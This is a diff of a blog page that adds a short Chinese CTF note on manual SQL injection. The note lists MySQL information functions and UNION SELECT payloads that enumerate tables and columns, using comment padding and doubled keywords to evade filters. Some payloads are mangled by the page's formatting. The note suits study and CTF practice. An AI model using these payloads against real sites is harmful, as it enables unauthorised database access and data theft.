@@ -160,6 +160,80 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-手动注入" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/12/手动注入/">手动注入</a>
+    </h1>
+  
+
+        
+        <a href="/2018/12/12/手动注入/" class="archive-article-date">
+  	<time datetime="2018-12-12T13:07:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="1-测试是否可以注入，可以用布尔监测。"><a href="#1-测试是否可以注入，可以用布尔监测。" class="headerlink" title="1.测试是否可以注入，可以用布尔监测。"></a>1.测试是否可以注入，可以用布尔监测。</h2><p>几个常用的函数：<br>user()返回当前数据库连接使用的用户；<br>database()返回当前数据库连接使用的数据库；<br>version()返回当前数据库的版本；<br><--more--><br>table_name<br>information_schema.table<br>table_schema<br>column_name<br>information_schema.columns<br>1’ union/<strong>/select/</strong>table_name/<strong>/from/</strong>/information_schema.tables/<strong>/where/</strong>/‘1’=’1<br>1’ union/<strong>/select/</strong>/column_name/<strong>/information_schema.columnsa.columns/</strong>/where/<strong>/table_name=’flag<br>1’ union/</strong>/select/<strong>/column_namcolumn_namee/</strong>/from/<strong>/information_scheminformation_schema.columnsa.columns/</strong>/where/<strong>/table_name=’flag<br>1’ union/</strong>/select/<strong>/column_name/</strong>/from/<strong>/information_schema.columns/</strong>/where/**/table_name=’flag<br>concat或者concat-ws函数可以将这些函数进行组合使用并显示出来。concat函数中，将其中的参数直接连接起来产生新的字符串。而在concat_ws函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。以其常用的例子为例：<br>concat_ws(char(32,58,32),user(),database(),version())其中char()函数为将里面的参数转化为相应的字符，其中32为空格，58为冒号(:)，通过这样的方式可以绕过一些简单的过滤机制。</--more--></p>
+<h2 id="2-用union语句接上select语句使用前面提过的函数组合即可查询到用户、数据库及其版本等信息"><a href="#2-用union语句接上select语句使用前面提过的函数组合即可查询到用户、数据库及其版本等信息" class="headerlink" title="2.用union语句接上select语句使用前面提过的函数组合即可查询到用户、数据库及其版本等信息"></a>2.用union语句接上select语句使用前面提过的函数组合即可查询到用户、数据库及其版本等信息</h2><h2 id="3-查询所有的表名"><a href="#3-查询所有的表名" class="headerlink" title="3.查询所有的表名"></a>3.查询所有的表名</h2><h2 id="4-直接对其进行进一步的查询，查看其所有的列名"><a href="#4-直接对其进行进一步的查询，查看其所有的列名" class="headerlink" title="4.直接对其进行进一步的查询，查看其所有的列名"></a>4.直接对其进行进一步的查询，查看其所有的列名</h2><h2 id="5-直接查询数据"><a href="#5-直接查询数据" class="headerlink" title="5.直接查询数据"></a>5.直接查询数据</h2>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/12/12/手动注入/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-sqlmap简单使用和dwna" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
